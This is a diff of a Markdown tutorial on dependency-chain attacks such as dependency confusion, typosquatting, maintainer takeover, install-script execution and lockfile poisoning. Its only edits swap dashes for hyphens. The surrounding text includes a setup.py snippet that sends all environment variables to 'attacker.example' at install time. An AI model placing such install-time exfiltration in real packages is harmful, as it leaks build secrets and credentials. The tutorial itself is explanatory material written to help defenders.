@@ -8,9 +8,9 @@
 
 ## Understanding Dependency Chain Attack Vectors
 
-> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are described so you can find and fix these weaknesses in build systems you own or are authorised to test. Publishing malicious packages or targeting names you do not control is illegal.
+> **⚠️ EDUCATIONAL PURPOSE ONLY** - the techniques below are described so you can find and fix these weaknesses in build systems you own or are authorised to test. Publishing malicious packages or targeting names you do not control is illegal.
 
-Dependency Chain Abuse is not exploited by breaking into your network. The attacker never touches your infrastructure directly—they publish or poison a package on a registry your build already trusts, then wait for your pipeline to fetch it. The entire attack happens through the **normal, automated dependency-resolution process**, which is exactly why it is so hard to notice.
+Dependency Chain Abuse is not exploited by breaking into your network. The attacker never touches your infrastructure directly-they publish or poison a package on a registry your build already trusts, then wait for your pipeline to fetch it. The entire attack happens through the **normal, automated dependency-resolution process**, which is exactly why it is so hard to notice.
 
 The attacker's goal is one of:
 
@@ -60,7 +60,7 @@ npm install
 #   -> malicious 99.99.99 is fetched and its postinstall runs
 ```
 
-**Payoff**: code execution with no typo and no social engineering—the version-selection rule does the work. The same class applies to pip (`--extra-index-url` merging indexes), Maven (public repo before private), and others.
+**Payoff**: code execution with no typo and no social engineering-the version-selection rule does the work. The same class applies to pip (`--extra-index-url` merging indexes), Maven (public repo before private), and others.
 
 ### 2. Typosquatting a Popular Name
 
@@ -107,7 +107,7 @@ The attacker seizes an existing, trusted package and ships a malicious version t
 good-logger  4.7.2  (clean)  ->  4.7.3  (malicious, same trusted name)
 ```
 
-**Payoff**: the poisoned version is already in the ecosystem's lockfiles and pulls in on the next upgrade—no new name to detect.
+**Payoff**: the poisoned version is already in the ecosystem's lockfiles and pulls in on the next upgrade-no new name to detect.
 
 ### 5. Abandoned / Expired Package Reuse
 
@@ -124,7 +124,7 @@ A deleted or de-published name, or one whose maintainer vanished, is re-register
 
 ### 6. Install-Time Script Execution
 
-Once any malicious package is resolved, lifecycle scripts run automatically—this is the actual code-execution step for most of the classes above.
+Once any malicious package is resolved, lifecycle scripts run automatically-this is the actual code-execution step for most of the classes above.
 
 ```js
 // package.json in the malicious package
@@ -132,14 +132,14 @@ Once any malicious package is resolved, lifecycle scripts run automatically—th
 ```
 
 ```python
-# Python equivalent — arbitrary code in setup.py at install time
+# Python equivalent - arbitrary code in setup.py at install time
 # setup.py
 import os, urllib.request, json
 urllib.request.urlopen("https://attacker.example/x",
     data=json.dumps(dict(os.environ)).encode())   # secrets leave the agent
 ```
 
-**Payoff**: RCE on the build agent as the CI user—before your code runs and whether or not you import the package.
+**Payoff**: RCE on the build agent as the CI user-before your code runs and whether or not you import the package.
 
 ### 7. Misconfigured Registry Resolution
 
@@ -152,13 +152,13 @@ registry=https://registry.npmjs.org/          # public is the default
 ```
 
 ```bash
-# pip merging a private index WITH PyPI — highest version across both wins:
+# pip merging a private index WITH PyPI - highest version across both wins:
 pip install -r requirements.txt \
     --index-url https://pypi.org/simple \
     --extra-index-url https://pypi.internal/acme/simple
 ```
 
-**Payoff**: the resolver, not the attacker, chooses the malicious copy—because the config told it public was fair game.
+**Payoff**: the resolver, not the attacker, chooses the malicious copy-because the config told it public was fair game.
 
 ### 8. Lockfile and Cache Poisoning
 
@@ -172,7 +172,7 @@ A single bad resolution is captured into a lockfile or a shared build cache and 
 # Every subsequent `npm ci` now faithfully re-installs the malicious pin.
 ```
 
-**Payoff**: persistence—the poisoning survives long after the attacker's package is removed from the registry.
+**Payoff**: persistence-the poisoning survives long after the attacker's package is removed from the registry.
 
 ### 9. Transitive Graph Poisoning
 
@@ -182,10 +182,10 @@ The attacker compromises a deep, indirect dependency; it rides upward into your 
 your-app
 +- ui-widgets        (you chose this)
    +- color-parse    (you did not)
-      +- str-utils    (compromised — attacker code lives here)
+      +- str-utils    (compromised - attacker code lives here)
 ```
 
-**Payoff**: depth is camouflage—nobody audits `str-utils`, yet its install script runs in your pipeline.
+**Payoff**: depth is camouflage-nobody audits `str-utils`, yet its install script runs in your pipeline.
 
 ## Chaining the Abuse
 
@@ -211,11 +211,11 @@ Maintainer account takeover (no MFA)      -> poison a trusted transitive dep
 
 ## Key Takeaways
 
-1. **The attacker uses your own resolver**—they publish or poison, and the build fetches; no direct intrusion is needed.
-2. **Names are the weapon**—confusion, typosquats, and brandjacks all abuse trust in a human-friendly name.
-3. **Installing is executing**—lifecycle scripts turn a fetched package into RCE on the build agent.
-4. **Trusted packages get poisoned too**—account takeover and transitive compromise bypass "reputable-only" rules.
-5. **Bad resolutions persist**—lockfiles and caches faithfully re-install a poisoned pin long after takedown.
+1. **The attacker uses your own resolver**-they publish or poison, and the build fetches; no direct intrusion is needed.
+2. **Names are the weapon**-confusion, typosquats, and brandjacks all abuse trust in a human-friendly name.
+3. **Installing is executing**-lifecycle scripts turn a fetched package into RCE on the build agent.
+4. **Trusted packages get poisoned too**-account takeover and transitive compromise bypass "reputable-only" rules.
+5. **Bad resolutions persist**-lockfiles and caches faithfully re-install a poisoned pin long after takedown.
 
 ## Next Steps
 
